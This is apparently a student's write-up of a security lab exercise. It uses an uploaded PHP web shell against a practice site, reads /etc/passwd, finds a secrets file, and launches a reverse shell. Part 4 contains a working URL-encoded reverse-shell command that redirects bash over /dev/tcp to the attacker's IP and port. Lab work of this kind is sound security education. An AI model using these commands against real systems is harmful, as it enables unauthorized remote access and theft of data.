Part 1: Installing a PHP Web Shell
a. After uploading the PHP webshell script that was provided in the assignment, I followed the target path
	that was provided after uploading the script: uploadedimages/sonr-webshell.php and input this path
	at the end of http://danger.jeffondich.com/ so the full link becomes: 
	http://danger.jeffondich.com/uploadedimages/sonr-webshell.php?command=whoami and the final result
	that was outputted was www-data
b. <pre> tag is used to format the output data with new line inputs, otherwise the browser will intepret
	the output as HTML if the <pre> tag is left out.

Part 2: Looking Around
a. /var/www/
b. root daemon bin sys sync games man lp mail news uucp proxy www-data backup list irc gnats nobody 
	systemd-network systemd-resolve messagebus systemd-timesync syslog _apt tss uuidd tcpdump usbmux sshd 
	pollinate landscape fwupd-refresh jeff postgres bullwinkle, these were found using getent passwd which 
	contains all of the users that the server contains.
c. After typing in "cat /etc/*passwd" I was able to access the contents of passwd. /etc/passwd contains the 
	users' public information such as their login name and home directories.
d. No, every time I try to cat the file, it resets the connection. /etc/shadow contains the hashed password
	for the users' logins. 
e. Found the kindasecret.txt file
	cat /var/www/danger.jeffondich.com/secrets/kindasecret.txt

Part 3: Setup for Part 4
 
Part 4: Launching a Reverse Shell
a. 192.168.64.2, ifconfig on Kali
b. 192.168.64.1 and 127.0.0.1, ifconfig on MacOS, use 192.168.64.2 because they share the same subnet mask so
	they are on the same network.
c. 5001
d. http://192.168.68.2/webshell.php?command=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.68.1/5001%200%3E%261%22
e. I have a shell now and can execute commands such as ls and cat /etc/passwd
f. Percent allows for the insertion of special characters into the bash that allows for it to redirect the bash
	output to my terminal.
g. Firstly the apache server needs to started on Kali. Then a php file called webshell is added to the apache server. 
	This requires read privledges to allow apache to read the php file in /var/www/html on Kali. After which the IP 
	addresses for both of the host OS and the apache server are required to begin a cross connection between the two. 
	By entering this url: http://192.168.68.2/webshell.php?command=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.68.1/5001%200%3E%261%22 
	it will establish that connection on port 5001, where the server will connect to the host OS that is listening on the port. 
	This will then allow the host OS (the attacker) to input bash commands and then the server will reply with the output of the bash as if it were a terminal.
